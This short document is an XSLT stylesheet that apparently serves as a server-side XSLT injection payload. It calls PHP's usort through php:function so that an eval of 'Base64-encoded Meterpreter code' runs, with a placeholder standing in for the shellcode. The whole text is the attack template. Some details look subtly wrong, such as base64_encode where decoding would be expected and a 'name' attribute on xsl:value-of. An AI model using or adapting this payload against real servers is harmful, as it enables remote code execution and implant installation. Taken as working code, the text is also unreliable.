<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
         <xsl:template match="/">
                  
                 <xsl:variable name="eval">
                          eval(base64_encode('Base64-encoded Meterpreter code'))
                   </xsl:variable>
                  <xsl:for-each select="element">
                   <xsl:value-of name="preg" select="php:function('usort', string(@name), $eval)"/>
                 </xsl:for-each>
         </xsl:template>
  </xsl:stylesheet>
